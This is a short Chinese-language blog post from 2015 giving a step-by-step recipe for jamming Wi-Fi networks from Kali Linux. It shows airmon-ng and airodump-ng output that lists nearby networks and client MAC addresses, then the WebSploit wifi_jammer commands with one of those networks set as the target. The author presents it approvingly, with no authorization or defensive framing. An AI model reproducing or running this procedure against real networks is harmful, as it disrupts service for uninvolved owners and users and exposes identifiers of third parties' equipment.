title: kali下进行wifi干扰
date: 2015-04-30 12:03:27
tags:
- kali
- wifi
- wifi干扰
---
wifi干扰, so good

首先启动混杂模式
ifconfig查看interface
```bash
airmon-ng start wlan0
```

```bash
Found 5 processes that could cause trouble.
If airodump-ng, aireplay-ng or airtun-ng stops working after
a short period of time, you may want to kill (some of) them!
-e
PID Name
2595    NetworkManager
2678    wpa_supplicant
3097    dhclient
7173    dhclient
7268    dhclient
Process with PID 7268 (dhclient) is running on interface wlan2
Process with PID 7173 (dhclient) is running on interface wlan0


Interface   Chipset     Driver

wlan2       Ralink 2573 USB rt73usb - [phy9]
wlan0       Atheros AR9285  ath9k - [phy0]
                (monitor mode enabled on mon0)
```

然后airodump mon0
看到一大堆wifi


```bash
CH  5 ][ Elapsed: 12 s ][ 2015-02-20 11:26 ][ WPA handshake: D4:EE:07:1C:4B:92

 BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID

 70:3A:D8:11:46:E8  -86        3        0    0  11  54e. WPA  CCMP   PSK  llp
 C8:3A:35:50:5B:88  -88        3        0    0  10  54e  WPA  CCMP   PSK  Tenda_505B88
 62:89:E4:44:4A:76  -60       26        0    0   7  54e  WPA2 CCMP   PSK  USER_3004
 A0:89:E4:44:4A:75  -58       26        0    0   7  54e  OPN              <length:  6>
 D4:EE:07:1C:4B:92  -61       28        8    0   1  54e  WPA2 CCMP   PSK  HiWiFi_1C4B92
 6C:E8:73:F7:19:98  -64       18        1    0   6  54e. WPA2 CCMP   PSK  JaydanKuk
 50:BD:5F:19:A1:2D  -71       22        0    0   6  54e. WPA2 CCMP   PSK  TP-LINK_A12D
 80:89:17:11:A8:3F  -73        0        0    0   6  54e. WPA2 CCMP   PSK  ZLINFENG_Network
 08:10:77:8C:D7:9F  -82        2        0    0   6  54e  WPA2 CCMP   PSK  li3003
 58:87:E2:6D:F2:2C  -82       19        2    0   1  54e  OPN              Coship_6DF22C
 58:87:E2:1D:4A:D6  -84       12        0    0   1  54e  OPN              Coship_1D4AD6
 58:87:E2:6D:E8:6C  -85        9        0    0   1  54e  OPN              Coship_6DE86C
 80:89:17:56:D6:3D  -88        5        0    0  11  54e. WPA2 CCMP   PSK  2503
 58:87:E2:36:A5:30  -88       15        0    0   1  54e  WPA2 CCMP   PSK  Coship_3104
 A0:89:E4:31:BD:7C  -88       10        0    0   1  54e  OPN              <length:  6>
 64:09:80:08:79:37  -90       10        0    0   3  54e  WPA2 CCMP   PSK  cngugu
 6A:89:E4:31:BD:7D  -90       11        0    0   1  54e  WPA2 CCMP   PSK  USER_2802

 BSSID              STATION            PWR   Rate    Lost    Frames  Probe

 (not associated)   D4:97:0B:53:5D:57  -90    0 - 1      1        4
 (not associated)   44:33:4C:EE:1F:84  -92    0 - 1      0        2
 D4:EE:07:1C:4B:92  CC:AF:78:29:FD:9D    0    1e- 1      0      165  HiWiFi_1C4B92
 6C:E8:73:F7:19:98  04:1B:BA:3D:54:D4   -1    0e- 0      0        1
 ```

打开另一个终端
启动websploit


```bash
root@kali:~# websploit
WARNING: No route found for IPv6 destination :: (no default route?)

db   d8b   db d88888b d8888b. .d8888. d8888b. db       .d88b.  d888888b d888888b
88   I8I   88 88'     88  `8D 88'  YP 88  `8D 88      .8P  Y8.   `88'   `~~88~~'
88   I8I   88 88ooooo 88oooY' `8bo.   88oodD' 88      88    88    88       88
Y8   I8I   88 88~~~~~ 88~~~b.   `Y8b. 88~~~   88      88    88    88       88
`8b d8'8b d8' 88.     88   8D db   8D 88      88booo. `8b  d8'   .88.      88
 `8b8' `8d8'  Y88888P Y8888P' `8888Y' 88      Y88888P  `Y88P'  Y888888P    YP

        --=[WebSploit FrameWork
    +---**---==[Version :2.0.5 BETA
    +---**---==[Codename :We're Not Crying Wolf
    +---**---==[Available Modules : 19
        --=[Update Date : [r2.0.5-000 2.3.2014]
```


输入use wifi/wifi_jammer
```bash
show options
```
然后设置频道，essid，bssid
就是用airodump-ng扫出来的那些
选择的自己目标
```bash
set bsssid 6C:E8:73:F7:19:98
set essid xxxxx
set channel 6
```
然后RUN
就会弹出几个终端，已经开始干扰了
good luck
